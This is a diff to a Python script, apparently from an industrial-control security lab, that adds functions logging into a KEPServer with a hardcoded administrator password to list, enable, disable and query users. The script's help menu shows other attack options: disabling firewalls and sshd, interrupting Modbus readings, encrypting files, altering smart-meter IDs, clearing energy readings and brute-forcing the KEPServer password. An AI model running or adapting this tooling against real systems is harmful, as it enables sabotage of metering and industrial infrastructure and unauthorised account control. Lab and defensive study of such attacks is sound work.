@@ -16,6 +16,9 @@ from win32console import GetConsoleWindow
 from win32gui import ShowWindow
 import kepconfig
 import pkgutil
+from kepconfig import connection, admin, connectivity
+import json
+import sys
 
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
 smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
@@ -981,6 +984,34 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
+def kep_connect():
+    # 172.16.2.77 if at lv 7
+    # 172.16.2.223 if at lv 6
+    server = connection.server(host = '172.16.2.223', port = 57412, user = 'Administrator', pw = 'administrator2022')
+    print("Connected to KEP server.")
+    return server
+
+def kep_server_info():
+    server = kep_connect()
+    print(json.dumps(server.get_info(), indent=4),file=sys.stdout)
+
+def kep_get_all_users():
+    server = kep_connect()
+    print(json.dumps(admin.users.get_all_users(server),indent=4))
+
+def kep_enable_user(user):
+    server = kep_connect()
+    print(admin.users.enable_user(server, user),file=sys.stdout)
+
+def kep_disable_user(user):
+    server = kep_connect()
+    print(admin.users.disable_user(server, user),file=sys.stdout)
+
+def kep_get_single_user(user):
+    server = kep_connect()
+    print(admin.users.get_user(server, user))
+
+
 if __name__ == '__main__':
     attackoption = str(argv[1])
     if attackoption != "1":
@@ -1027,6 +1058,17 @@ if __name__ == '__main__':
         changeBaudRate()
     elif attackoption == "14": # Test checkbaudrate
         checkBaudRate()
+    elif attackoption == "15":
+       kep_server_info()
+    elif attackoption == "16":
+       kep_get_all_users()
+    elif attackoption == "17":
+       kep_enable_user("User1")
+    elif attackoption == "18":
+       kep_disable_user("User1")
+    elif attackoption == "19":
+       kep_get_single_user("User1")
+    
     elif attackoption == "-h":
         print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
 
